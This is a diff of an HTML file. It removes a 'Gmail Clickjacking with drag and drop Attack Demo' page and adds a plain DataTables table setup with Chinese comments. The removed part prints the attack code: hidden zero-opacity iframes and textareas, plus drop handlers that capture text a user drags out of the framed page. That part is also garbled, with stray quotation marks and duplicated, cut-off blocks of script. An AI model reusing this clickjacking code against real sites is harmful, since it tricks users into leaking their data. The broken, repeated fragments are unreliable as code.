@@ -1,156 +1,63 @@
-“<html>
-<head>
-    <title>
-        Gmail Clickjacking with drag and drop
-        Attack Demo
-    </title>
-    <style>
-        .iframe_hidden{height: 50px; width:
-                50px; top:360px; left:365px; overflow:hidden;
-            filter: alpha(opacity=0); opacity:.0;
-            position: absolute; } .text_area_hidden{
-                                      height: 30px; width: 30px; top:160px;
-                                      left:670px; overflow:hidden; filter:
-                    alpha(opacity=0); opacity:.0;
-                                      position: absolute; } .ball{ top:350px;
-                                                                left:350px;
-                                                                position:
-                                                                        absolute; } .ball_1{ top:136px; left:640px;
-                                                                                        filter: alpha(opacity=0);
-                                                                                        opacity:.0; position:
-                    absolute; }.Dolphin{ top:150px; left:600px;
-                                   position:
-                                           absolute; }.center{ margin-right:
-                auto;margin-left: auto;
-                                                          vertical-align:middle;text-align:center;
-                                                          margin-top:350px;}
-    </style>
-    <script>
-        function Init() {
-            var source =
-                document.getElementById("source");
-            var target =
-                document.getElementById("target");
-            if (source.addEventListener) {
-                target.addEventListener("drop",
-                    DumpInfo, false);
-            } else {
-                target.attachEvent("ondrop",
-                    DumpInfo);
-            }
-        }
-        function DumpInfo(event) {
-            showHide_ball.call(this);
- “er;
-            margin-top:350px;}
-        </style>
-        <script>
-        function Init() {
-            var source =
-                document.getElementById("source");
-            var target =
-                document.getElementById("target");
-            if (source.addEventListener) {
-                target.addEventListener("drop",
-                    DumpInfo, false);
-            } else {
-                target.attachEvent("ondrop",
-                    DumpInfo);
-            }
-        }
-        function DumpInfo(event) {
-            showHide_ball.call(this);
-            showHide_ball_1.call(this);
-            var info =
-                document.getElementById("info");
-            info.innerHTML += "<span
-            style='color:#3355cc;font-size:13px'>" +
-            event.dataTransfer.getData('Text') + "</
-            span><br> ";
-        }
-        function showHide_frame() {
-            var iframe_1 =
-                document.getElementById("iframe_1");
-            iframe_1.style.opacity =
-                this.checked ? "0.5": "0";
-            iframe_1.style.filter =
-                "progid:DXImageTransform.Microsoft.Alpha(opac
-            ity=" +
-            (this.checked ? "50": "0") + ");"
-        }
-        function showHide_text() {
-            var text_1 =
-                document.getElementById("target");
-            text_1.style.opacity =
-                this.checked ? "0.5": "0";
-            text_1.style.filter =
-                "progid:DXImageTransform.Microsoft.Alpha(opac
-            ity=" +
-            (this.checked ? "50": "0") + ");"
-        }
-        function showHide_ball() {
-            var hide_ball =
-                document.getElementById("hide_ball");
-            hide_ball.style.opacity = "0";
-            hide_ball.style.filter =
-                "alpha(opacity=0)";
-        }
-        function showHide_ball_1() {
-            var hide_ball_1 =
-                document.getElementById("hide_ball_1");
-            hide_ball_1.style.opacity = "1";
-            hide_ball_1.style.filter =
-                "alpha(opacity=100)";
-“his.checked ? "0.5": "0";
-            text_1.style.filter =
-                "progid:DXImageTransform.Microsoft.Alpha(opac
-            ity=" +
-            (this.checked ? "50": "0") + ");"
-        }
-        function showHide_ball() {
-            var hide_ball =
-                document.getElementById("hide_ball");
-            hide_ball.style.opacity = "0";
-            hide_ball.style.filter =
-                "alpha(opacity=0)";
-        }
-        function showHide_ball_1() {
-            var hide_ball_1 =
-                document.getElementById("hide_ball_1");
-            hide_ball_1.style.opacity = "1";
-            hide_ball_1.style.filter =
-                "alpha(opacity=100)";
-        }
-        function reload_text() {
+<!--第一步：引入Javascript / CSS （CDN）-->
+<!-- DataTables CSS -->
+<link rel="stylesheet" type="text/css" href="http://cdn.datatables.net/1.10.15/css/jquery.dataTables.css">
 
-            document.getElementById("target").value = '';
-        }
-    </script>
-</head>
-<body onload="Init();">
+<!-- jQuery -->
+<script type="text/javascript" charset="utf8" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
 
- <input id="showHide_text"
-          type="checkbox"
-          onclick="showHide_text.call(this);"
-/>
-<label for="showHide_text">
-    Show the jacked Textarea
-</label>
-|
-<input type=button value="Replay"
-       onclick="location.reload();reload_text();">
-</center>
-<br><br>
-<b>
-    Design by
-    <a target="_blank"
-       href="http://hi.baidu.com/xisigr">
-        xisigr
-    </a>
-</b>
-</center>
-</div>
-</body>
-</html>
+<!-- DataTables -->
+<script type="text/javascript" charset="utf8" src="http://cdn.datatables.net/1.10.15/js/jquery.dataTables.js"></script>
 
 
+<!--或者下载到本地，下面有下载地址-->
+<!-- DataTables CSS -->
+<link rel="stylesheet" type="text/css" href="DataTables-1.10.15/media/css/jquery.dataTables.css">
+
+<!-- jQuery -->
+<script type="text/javascript" charset="utf8" src="DataTables-1.10.15/media/js/jquery.js"></script>
+
+<!-- DataTables -->
+<script type="text/javascript" charset="utf8" src="DataTables-1.10.15/media/js/jquery.dataTables.js"></script>
+<script>
+    $(document).ready(function () {
+        $('#example').DataTable({
+            "ajax": "data.json",
+            "columns": [
+                { "data": "name" },
+                { "data": "position" },
+                { "data": "office" },
+                { "data": "extn" },
+                { "data": "start_date" },
+                null
+            ]
+        });
+    });
+
+</script>
+
+
+<table id="example" class="display" style="width:100%">
+    <thead>
+    <tr>
+        <th>Name</th>
+        <th>Position</th>
+        <th>Office</th>
+        <th>Extn.</th>
+        <th>Start date</th>
+        <th>Salary</th>
+    </tr>
+    </thead>
+    <tfoot>
+    <tr>
+        <th>Name</th>
+        <th>Position</th>
+        <th>Office</th>
+        <th>Extn.</th>
+        <th>Start date</th>
+        <th>Salary</th>
+    </tr>
+    </tfoot>
+</table>
+
+
+<!--第三步：初始化Datatables-->
